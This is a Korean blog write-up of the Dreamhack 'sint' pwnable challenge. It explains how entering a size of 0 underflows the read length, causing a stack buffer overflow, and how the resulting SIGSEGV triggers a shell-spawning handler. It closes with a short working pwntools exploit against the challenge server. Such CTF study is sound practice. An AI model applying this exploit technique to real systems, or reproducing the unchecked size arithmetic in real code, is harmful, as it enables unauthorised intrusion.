---
title: Dreamhack wargame sint write-up
tags: [Dreamhack, pwnable, sint]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

## Code Analysis
---
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```
main 함수의 signal 함수에서 get_shell함수를 호출해준다. <br>
signal함수는 커널에서 예외처리 및 인터럽트를 위해 이벤트를 알려주는 함수이다. siganl함수의 첫번째 인자는 signal 번호이고 위 소스코드에서 보이는 SIGSEGV는 유효하지 않은 메모리에 엑세스 하였을 때 signal 함수가 호출된다.<br>
그 아래 구분에서는 size를 입력 받고 size - 1 만큼 buf 변수에 입력 받는다. size가 256이 넘는 경우에는 exit 함수를 호출한다.

<br>

## Vulnerability Analysis
---
main 함수의 조건문에서는 size가 0 초과 256 미만이라고 정해줬다. 따라서 size에 0을 입력했을 경우 아래의 read 함수에서 size - 1이 되면서 read 함수의 3번째 인자가 unsigned int형이기 때문에 Integer Overflow가 발생한다. 따라서 buf의 사이즈보다 더 많은 값을 넣어줄 수 있으며 BOF 취약점이 발생한다. BOF를 통해 허용되지 않은 메모리에 접근한다면 SIGSEGV로 인해 get_shell 함수가 실행된다.<br>

<br>

### Interer issues
```
Interger issues는 정수의 형 변환을 제대로 처리하지 못해 발생하는 문제입니다. 이는 각각의 자료형에 대한 범위를 고려하지 않을 때 발생하고, 독립적인 취약점으로 사용되기보다는 다른 취약점에 연계되어 사용됩니다.
```

<br>

## Exploit
---
``` python
from pwn import *

p = remote('host1.dreamhack.games','9280')

p.recvuntil('Size: ')
p.sendline('0')

p.recvuntil('Data: ')
p.sendline('A' * 260)

p.interactive()
```
![img1](/assets/sint/img1.png)
쉘을 획득했다.

<br>

### Good Game!
EZ



